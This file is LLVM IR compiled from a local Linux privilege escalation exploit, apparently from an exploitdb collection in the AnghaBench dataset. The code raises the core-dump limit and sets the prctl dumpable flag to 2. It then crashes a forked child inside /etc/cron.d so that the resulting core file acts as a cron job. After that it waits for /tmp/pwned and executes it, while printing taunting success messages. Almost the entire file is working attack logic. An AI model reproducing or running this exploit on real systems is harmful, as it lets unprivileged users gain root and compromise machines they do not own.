; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2006.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_2006.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.rlimit = type { i8*, i8* }
%struct.stat = type { i64 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"%s\0A%s\0A\0A\00", align 1
@INFO1 = common dso_local global i8* null, align 8
@INFO2 = common dso_local global i8* null, align 8
@pwnage = common dso_local global i8* null, align 8
@RLIM_INFINITY = common dso_local global i8* null, align 8
@RLIMIT_CORE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"/etc/cron.d\00", align 1
@PR_SET_DUMPABLE = common dso_local global i32 0, align 4
@SIGSEGV = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"/etc/cron.d/core\00", align 1
@.str.3 = private unnamed_addr constant [38 x i8] c"Error: Not vulnerable? See comments.\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"Ready to uncork the champagne? \00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"Please wait a couple of minutes;)\0A\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"/tmp/pwned\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"\0AError: Check /tmp/pwned!\0A\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.9 = private unnamed_addr constant [29 x i8] c"\0ATimeout: Check /tmp/pwned!\0A\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"CAMPIONI DEL MONDO!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.rlimit, align 8
  %5 = alloca %struct.stat, align 8
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @stderr, align 4
  %7 = load i8*, i8** @INFO1, align 8
  %8 = load i8*, i8** @INFO2, align 8
  %9 = call i32 (i32, i8*, ...) @fprintf(i32 %6, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %7, i8* %8)
  %10 = load i8*, i8** @pwnage, align 8
  %11 = call i32 @system(i8* %10)
  %12 = load i8*, i8** @RLIM_INFINITY, align 8
  %13 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %4, i32 0, i32 1
  store i8* %12, i8** %13, align 8
  %14 = load i8*, i8** @RLIM_INFINITY, align 8
  %15 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %4, i32 0, i32 0
  store i8* %14, i8** %15, align 8
  %16 = load i32, i32* @RLIMIT_CORE, align 4
  %17 = call i32 @setrlimit(i32 %16, %struct.rlimit* %4)
  %18 = call i32 (...) @fork()
  store i32 %18, i32* %2, align 4
  %19 = icmp ne i32 %18, 0
  br i1 %19, label %26, label %20

20:                                               ; preds = %0
  %21 = call i32 @chdir(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  %22 = load i32, i32* @PR_SET_DUMPABLE, align 4
  %23 = call i32 @prctl(i32 %22, i32 2)
  %24 = call i32 @sleep(i32 666)
  %25 = call i32 @exit(i32 1) #3
  unreachable

26:                                               ; preds = %0
  %27 = load i32, i32* %2, align 4
  %28 = load i32, i32* @SIGSEGV, align 4
  %29 = call i32 @kill(i32 %27, i32 %28)
  %30 = call i32 @sleep(i32 3)
  %31 = call i64 @stat(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), %struct.stat* %5)
  %32 = icmp slt i64 %31, 0
  br i1 %32, label %33, label %37

33:                                               ; preds = %26
  %34 = load i32, i32* @stderr, align 4
  %35 = call i32 (i32, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0))
  %36 = call i32 @exit(i32 1) #3
  unreachable

37:                                               ; preds = %26
  %38 = load i32, i32* @stderr, align 4
  %39 = call i32 (i32, i8*, ...) @fprintf(i32 %38, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  %40 = load i32, i32* @stderr, align 4
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %40, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %42

42:                                               ; preds = %61, %37
  %43 = load i32, i32* %3, align 4
  %44 = icmp slt i32 %43, 124
  br i1 %44, label %45, label %64

45:                                               ; preds = %42
  %46 = call i64 @stat(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), %struct.stat* %5)
  %47 = icmp slt i64 %46, 0
  br i1 %47, label %48, label %52

48:                                               ; preds = %45
  %49 = load i32, i32* @stderr, align 4
  %50 = call i32 (i32, i8*, ...) @fprintf(i32 %49, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0))
  %51 = call i32 @exit(i32 1) #3
  unreachable

52:                                               ; preds = %45
  %53 = getelementptr inbounds %struct.stat, %struct.stat* %5, i32 0, i32 0
  %54 = load i64, i64* %53, align 8
  %55 = icmp eq i64 %54, 0
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  br label %64

57:                                               ; preds = %52
  %58 = load i32, i32* @stderr, align 4
  %59 = call i32 (i32, i8*, ...) @fprintf(i32 %58, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  %60 = call i32 @sleep(i32 2)
  br label %61

61:                                               ; preds = %57
  %62 = load i32, i32* %3, align 4
  %63 = add nsw i32 %62, 2
  store i32 %63, i32* %3, align 4
  br label %42

64:                                               ; preds = %56, %42
  %65 = load i32, i32* %3, align 4
  %66 = icmp sgt i32 %65, 120
  br i1 %66, label %67, label %71

67:                                               ; preds = %64
  %68 = load i32, i32* @stderr, align 4
  %69 = call i32 (i32, i8*, ...) @fprintf(i32 %68, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.9, i64 0, i64 0))
  %70 = call i32 @exit(i32 1) #3
  unreachable

71:                                               ; preds = %64
  %72 = load i32, i32* @stderr, align 4
  %73 = call i32 (i32, i8*, ...) @fprintf(i32 %72, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0))
  %74 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0))
  %75 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @setrlimit(i32, %struct.rlimit*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @prctl(i32, i32) #1

declare dso_local i32 @sleep(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
